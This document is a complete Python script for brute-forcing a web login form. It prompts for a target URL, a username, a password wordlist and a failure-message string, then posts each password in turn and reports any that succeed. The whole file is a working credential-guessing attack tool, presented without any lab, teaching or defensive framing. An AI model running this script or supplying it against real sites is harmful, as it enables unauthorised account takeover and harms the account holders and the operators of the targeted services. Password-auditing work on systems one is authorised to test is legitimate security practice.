import requests
import sys
import time

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

url = input(f'{CYAN}[+] Enter Page URL:{RESET} ')
username = input(f'{CYAN}[+] Enter Username for the account to bruteforce:{RESET} ')
password_file = input(f'{CYAN}[+] Enter Password File To Use:{RESET} ')
login_failed_string = input(f'{CYAN}[+] Enter String that occurs when login fails:{RESET} ')
delay = input(f'{CYAN}[+] Enter delay between attempts (seconds, default 0):{RESET} ')

try:
    delay = float(delay)
except ValueError:
    delay = 0

def cracking(username, url, passwords, login_failed_string, delay):
    attempt = 0
    for password in passwords:
        password = password.strip()
        attempt += 1
        print(f'{BLUE}Trying ({attempt}):{RESET} {YELLOW}{password}{RESET}')
        data = {'username': username, 'password': password, 'Login': 'submit'}
        try:
            response = requests.post(url, data=data, timeout=10)
        except requests.RequestException as e:
            print(f'{RED}[!] Request failed:{RESET} {e}')
            continue

        if login_failed_string in response.text:
            pass
        else:
            print(f'\n{GREEN}[+] Success!{RESET}')
            print(f'{CYAN}[+] Found Username: ==> {RESET}{GREEN}{username}{RESET}')
            print(f'{CYAN}[+] Found Password: ==> {RESET}{GREEN}{password}{RESET}')
            sys.exit(0)
        if delay > 0:
            time.sleep(delay)
    print(f'\n{RED}[-] Password not found in the provided file.{RESET}')

try:
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as passwords:
        cracking(username, url, passwords, login_failed_string, delay)
except FileNotFoundError:
    print(f'{RED}[!] Password file "{password_file}" not found.{RESET}')
except Exception as e:
    print(f'{RED}[!] An error occurred:{RESET} {e}')
